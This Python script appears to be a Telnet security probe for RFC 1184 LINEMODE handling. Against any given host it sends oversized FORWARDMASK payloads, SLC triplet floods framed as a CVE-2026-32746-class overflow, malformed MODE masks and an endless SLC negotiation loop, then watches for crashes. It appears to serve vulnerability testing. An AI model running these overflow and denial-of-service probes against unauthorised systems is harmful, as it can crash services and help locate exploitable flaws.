#!/usr/bin/env python3
"""
Telnet security probe — tests findings from rfc-analyzer reports.
Focuses on novel (no-CVE) findings:
  1. FORWARDMASK buffer overrun (RFC 1184 §5.6)
  2. Premature FORWARDMASK state bypass (RFC 1184 §5.7)
  3. SLC subnegotiation overflow (the CVE-2026-32746 class)
  4. MODE mask manipulation
  5. SLC negotiation loop
  6. LINEMODE downgrade

Usage: python probe_telnet.py <host> [port]
"""

import socket
import sys
import time
import struct

# Telnet protocol constants
IAC  = b'\xff'  # 255
DONT = b'\xfe'  # 254
DO   = b'\xfd'  # 253
WONT = b'\xfc'  # 252
WILL = b'\xfb'  # 251
SB   = b'\xfa'  # 250 - subnegotiation begin
SE   = b'\xf0'  # 240 - subnegotiation end

# Options
OPT_ECHO     = bytes([1])
OPT_SGA      = bytes([3])
OPT_TTYPE    = bytes([24])
OPT_NAWS     = bytes([31])
OPT_LINEMODE = bytes([34])

# LINEMODE suboption codes
LM_MODE      = bytes([1])
LM_FORWARDMASK = bytes([2])
LM_SLC       = bytes([3])

# SLC function codes (RFC 1184 §2.4)
SLC_SYNCH    = 1
SLC_BRK      = 2
SLC_IP       = 3
SLC_AO       = 4
SLC_AYT      = 5
SLC_EOR      = 6
SLC_ABORT    = 7
SLC_EOF      = 8
SLC_SUSP     = 9
SLC_EC       = 10
SLC_EL       = 11
SLC_EW       = 12
SLC_RP       = 13
SLC_LNEXT    = 14
SLC_XON      = 15
SLC_XOFF     = 16
SLC_FORW1    = 17
SLC_FORW2    = 18
SLC_MCR      = 19  # might not exist
SLC_MAXFUNC  = 18

# SLC level/flags
SLC_NOSUPPORT  = 0
SLC_CANTCHANGE = 1
SLC_VALUE      = 2
SLC_DEFAULT    = 3
SLC_LEVELBITS  = 0x03
SLC_ACK        = 0x80
SLC_FLUSHIN    = 0x40
SLC_FLUSHOUT   = 0x20

# MODE bits
MODE_EDIT     = 0x01
MODE_TRAPSIG  = 0x02
MODE_ACK      = 0x04
MODE_SOFT_TAB = 0x08
MODE_LIT_ECHO = 0x10


def recv_all(sock, timeout=2):
    """Read all available data with timeout."""
    sock.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def parse_telnet(data):
    """Parse telnet data, return list of (type, content) tuples."""
    events = []
    i = 0
    while i < len(data):
        if data[i] == 0xff and i + 1 < len(data):
            cmd = data[i+1]
            if cmd in (0xfb, 0xfc, 0xfd, 0xfe):  # WILL/WONT/DO/DONT
                if i + 2 < len(data):
                    events.append(('cmd', cmd, data[i+2]))
                    i += 3
                else:
                    i += 2
            elif cmd == 0xfa:  # SB
                # Find SE
                se_pos = data.find(b'\xff\xf0', i+2)
                if se_pos >= 0:
                    sub_data = data[i+2:se_pos]
                    events.append(('sub', sub_data))
                    i = se_pos + 2
                else:
                    i += 2
            elif cmd == 0xff:  # escaped 0xff
                i += 2
            else:
                events.append(('cmd', cmd, None))
                i += 2
        else:
            # Text
            text_start = i
            while i < len(data) and data[i] != 0xff:
                i += 1
            events.append(('text', data[text_start:i]))
    return events


def connect_and_negotiate(host, port):
    """Connect and do basic negotiation."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # Read initial negotiation
    data = recv_all(sock, timeout=1)
    events = parse_telnet(data)

    # Respond to DO requests and accept WILL offers
    for ev in events:
        if ev[0] == 'cmd':
            cmd, opt = ev[1], ev[2]
            if cmd == 0xfd:  # DO -> respond WILL
                sock.sendall(IAC + WILL + bytes([opt]))
            elif cmd == 0xfb:  # WILL -> respond DO
                sock.sendall(IAC + DO + bytes([opt]))

    return sock, events


def test_linemode_support(host, port):
    """Test 1: Does the server support LINEMODE?"""
    print("=" * 60)
    print("TEST 1: LINEMODE Support Check")
    print("=" * 60)

    sock, events = connect_and_negotiate(host, port)

    # Request LINEMODE
    print("  Sending: IAC WILL LINEMODE")
    sock.sendall(IAC + WILL + OPT_LINEMODE)

    # Also send DO LINEMODE
    print("  Sending: IAC DO LINEMODE")
    sock.sendall(IAC + DO + OPT_LINEMODE)

    time.sleep(1)
    resp = recv_all(sock, timeout=2)
    resp_events = parse_telnet(resp)

    linemode_accepted = False
    for ev in resp_events:
        if ev[0] == 'cmd':
            cmd, opt = ev[1], ev[2]
            cmd_names = {0xfb: 'WILL', 0xfc: 'WONT', 0xfd: 'DO', 0xfe: 'DONT'}
            if opt == 34:  # LINEMODE
                print(f"  Response: IAC {cmd_names.get(cmd, hex(cmd))} LINEMODE")
                if cmd in (0xfb, 0xfd):  # WILL or DO
                    linemode_accepted = True

    if linemode_accepted:
        print("  [FINDING] Server accepts LINEMODE negotiation!")
    else:
        print("  [INFO] Server does not accept LINEMODE")

    sock.close()
    print()
    return linemode_accepted


def test_forwardmask_without_linemode(host, port):
    """Test 2: Send FORWARDMASK before LINEMODE is negotiated (premature state bypass)."""
    print("=" * 60)
    print("TEST 2: Premature FORWARDMASK (RFC 1184 §5.7)")
    print("=" * 60)

    sock, events = connect_and_negotiate(host, port)

    # Send FORWARDMASK subnegotiation WITHOUT negotiating LINEMODE first
    # FORWARDMASK is a 32-byte bitmask inside LINEMODE subnegotiation
    fmask = bytes(32)  # 32 zero bytes
    sub = IAC + SB + OPT_LINEMODE + LM_FORWARDMASK + fmask + IAC + SE

    print(f"  Sending FORWARDMASK subnegotiation ({len(sub)} bytes) WITHOUT LINEMODE")
    sock.sendall(sub)

    time.sleep(1)
    resp = recv_all(sock, timeout=2)

    if not resp:
        print("  Server sent nothing (silently ignored)")
        result = "ignored"
    else:
        resp_events = parse_telnet(resp)
        disconnected = len(resp) == 0
        has_error = any(ev[0] == 'text' and b'error' in ev[1].lower() for ev in resp_events if ev[0] == 'text')

        for ev in resp_events:
            if ev[0] == 'sub':
                print(f"  Server responded with subnegotiation: {ev[1].hex()}")
            elif ev[0] == 'text':
                text = ev[1].decode('ascii', errors='replace').strip()
                if text:
                    print(f"  Server text: {text[:80]}")

        result = "responded"

    # Check if connection is still alive
    try:
        sock.sendall(b'\r\n')
        time.sleep(0.5)
        alive = recv_all(sock, timeout=1)
        if alive:
            print(f"  Connection still alive after premature FORWARDMASK")
            print(f"  [NOTE] Server did not disconnect — may have processed it")
        else:
            print(f"  Connection appears dead")
    except:
        print(f"  Connection reset/closed by server")

    sock.close()
    print()
    return result


def test_forwardmask_overflow(host, port):
    """Test 3: Send oversized FORWARDMASK data (buffer overflow attempt)."""
    print("=" * 60)
    print("TEST 3: FORWARDMASK Buffer Overflow (RFC 1184 §5.6)")
    print("=" * 60)

    sock, events = connect_and_negotiate(host, port)

    # First try to negotiate LINEMODE
    sock.sendall(IAC + WILL + OPT_LINEMODE)
    sock.sendall(IAC + DO + OPT_LINEMODE)
    time.sleep(0.5)
    recv_all(sock, timeout=1)  # consume response

    # FORWARDMASK should be exactly 32 bytes per RFC 1184
    # Test with various oversized payloads
    sizes = [32, 64, 128, 256, 512, 1024, 4096]

    for size in sizes:
        # Need IAC doubling for 0xFF bytes in the payload
        # Use 0x41 ('A') to avoid IAC issues
        fmask_data = bytes([0x41] * size)
        sub = IAC + SB + OPT_LINEMODE + LM_FORWARDMASK + fmask_data + IAC + SE

        print(f"  Sending FORWARDMASK with {size} bytes (expected: 32)...")
        try:
            sock.sendall(sub)
            time.sleep(0.3)

            # Check if still alive
            try:
                sock.sendall(b'\x00')  # NOP
                alive = True
            except (BrokenPipeError, ConnectionResetError):
                alive = False

            if not alive:
                print(f"  [!!] Connection died at size {size}!")
                print(f"  This could indicate a crash or buffer overflow")
                break
            else:
                print(f"  Connection survived size {size}")

        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"  [!!] Connection reset at size {size}: {e}")
            break
        except Exception as e:
            print(f"  Error at size {size}: {e}")
            break
    else:
        print(f"  [OK] Server survived all sizes up to {sizes[-1]}")

    try:
        sock.close()
    except:
        pass
    print()


def test_slc_overflow(host, port):
    """Test 4: SLC subnegotiation with excessive triplets (CVE-2026-32746 class)."""
    print("=" * 60)
    print("TEST 4: SLC Triplet Overflow (CVE-2026-32746 class)")
    print("=" * 60)

    sock, events = connect_and_negotiate(host, port)

    # Negotiate LINEMODE
    sock.sendall(IAC + WILL + OPT_LINEMODE)
    sock.sendall(IAC + DO + OPT_LINEMODE)
    time.sleep(0.5)
    recv_all(sock, timeout=1)

    # Send SLC with increasing numbers of triplets
    # Each triplet is (function, flags, character) = 3 bytes
    triplet_counts = [10, 50, 100, 500, 1000]

    for count in triplet_counts:
        # Build SLC triplets: function=cycling through valid, flags=SLC_VALUE, char='A'
        triplets = b''
        for i in range(count):
            func = (i % SLC_MAXFUNC) + 1  # cycle through functions 1-18
            triplets += bytes([func, SLC_VALUE, 0x41])

        sub = IAC + SB + OPT_LINEMODE + LM_SLC + triplets + IAC + SE

        print(f"  Sending SLC with {count} triplets ({len(triplets)} bytes)...")
        try:
            sock.sendall(sub)
            time.sleep(0.3)

            try:
                sock.sendall(b'\x00')
                alive = True
            except (BrokenPipeError, ConnectionResetError):
                alive = False

            if not alive:
                print(f"  [!!] Connection died at {count} triplets!")
                print(f"  [FINDING] Server crashed or disconnected on oversized SLC")
                break
            else:
                print(f"  Connection survived {count} triplets")

        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"  [!!] Connection reset at {count} triplets: {e}")
            break
    else:
        print(f"  [OK] Server survived all sizes up to {triplet_counts[-1]} triplets")

    try:
        sock.close()
    except:
        pass
    print()


def test_mode_mask_manipulation(host, port):
    """Test 5: MODE mask with unusual bit combinations."""
    print("=" * 60)
    print("TEST 5: MODE Mask Manipulation (RFC 1184 §2.2)")
    print("=" * 60)

    sock, events = connect_and_negotiate(host, port)

    # Negotiate LINEMODE
    sock.sendall(IAC + WILL + OPT_LINEMODE)
    sock.sendall(IAC + DO + OPT_LINEMODE)
    time.sleep(0.5)
    recv_all(sock, timeout=1)

    # Send MODE with various mask values
    test_masks = [
        (0x00, "all bits clear (raw mode)"),
        (0x01, "EDIT only"),
        (0x02, "TRAPSIG only"),
        (0x03, "EDIT+TRAPSIG"),
        (0x07, "EDIT+TRAPSIG+ACK"),
        (0x1F, "all defined bits set"),
        (0xFF, "all bits set (undefined bits too)"),
        (0x80, "only undefined high bit"),
        (0xFE, "all bits except EDIT"),
    ]

    for mask, desc in test_masks:
        sub = IAC + SB + OPT_LINEMODE + LM_MODE + bytes([mask]) + IAC + SE
        try:
            sock.sendall(sub)
            time.sleep(0.2)
            resp = recv_all(sock, timeout=0.5)

            if resp:
                resp_events = parse_telnet(resp)
                for ev in resp_events:
                    if ev[0] == 'sub' and len(ev[1]) >= 2 and ev[1][0] == 34:  # LINEMODE sub
                        print(f"  MODE 0x{mask:02x} ({desc}): server responded with sub {ev[1].hex()}")
                    elif ev[0] == 'text':
                        text = ev[1].decode('ascii', errors='replace').strip()
                        if text:
                            print(f"  MODE 0x{mask:02x} ({desc}): text '{text[:60]}'")
            else:
                print(f"  MODE 0x{mask:02x} ({desc}): no response")

            # Check alive
            try:
                sock.sendall(b'\x00')
            except:
                print(f"  [!!] Connection died after MODE 0x{mask:02x}")
                break

        except (BrokenPipeError, ConnectionResetError):
            print(f"  [!!] Connection reset on MODE 0x{mask:02x} ({desc})")
            break

    try:
        sock.close()
    except:
        pass
    print()


def test_slc_negotiation_loop(host, port):
    """Test 6: SLC negotiation loop — keep disagreeing to test for infinite loop."""
    print("=" * 60)
    print("TEST 6: SLC Negotiation Loop DoS")
    print("=" * 60)

    sock, events = connect_and_negotiate(host, port)

    # Negotiate LINEMODE
    sock.sendall(IAC + WILL + OPT_LINEMODE)
    sock.sendall(IAC + DO + OPT_LINEMODE)
    time.sleep(0.5)
    recv_all(sock, timeout=1)

    # Send SLC values, then always disagree with server's response
    rounds = 0
    max_rounds = 50

    # Initial SLC: set EC (erase char) to 'Z'
    initial_slc = bytes([SLC_EC, SLC_VALUE, ord('Z')])
    sock.sendall(IAC + SB + OPT_LINEMODE + LM_SLC + initial_slc + IAC + SE)

    for _ in range(max_rounds):
        time.sleep(0.2)
        resp = recv_all(sock, timeout=0.5)
        if not resp:
            break

        resp_events = parse_telnet(resp)
        got_slc_response = False

        for ev in resp_events:
            if ev[0] == 'sub' and len(ev[1]) >= 4 and ev[1][0] == 34 and ev[1][1] == 3:
                # LINEMODE SLC response — disagree by sending different value
                got_slc_response = True
                rounds += 1
                # Respond with a different character to keep disagreeing
                counter_slc = bytes([SLC_EC, SLC_VALUE, ord('A') + (rounds % 26)])
                sock.sendall(IAC + SB + OPT_LINEMODE + LM_SLC + counter_slc + IAC + SE)

        if not got_slc_response:
            break

    print(f"  Negotiation went {rounds} rounds before stopping")
    if rounds >= max_rounds:
        print(f"  [FINDING] Server kept negotiating for {rounds}+ rounds!")
        print(f"           Potential infinite loop / resource exhaustion")
    elif rounds > 0:
        print(f"  [OK] Server stopped negotiating after {rounds} rounds")
    else:
        print(f"  [INFO] Server didn't engage in SLC negotiation")

    # Check if alive
    try:
        sock.sendall(b'\r\n')
        alive_data = recv_all(sock, timeout=1)
        print(f"  Connection still alive: {bool(alive_data)}")
    except:
        print(f"  Connection dead after negotiation loop")

    try:
        sock.close()
    except:
        pass
    print()


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <host> [port]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 23

    print(f"\nTelnet Security Probe — {host}:{port}")
    print(f"Testing novel findings from rfc-analyzer\n")

    linemode = test_linemode_support(host, port)
    test_forwardmask_without_linemode(host, port)
    test_forwardmask_overflow(host, port)
    test_slc_overflow(host, port)
    test_mode_mask_manipulation(host, port)
    test_slc_negotiation_loop(host, port)

    print("=" * 60)
    print("TELNET PROBE COMPLETE")
    print("=" * 60)


if __name__ == "__main__":
    main()
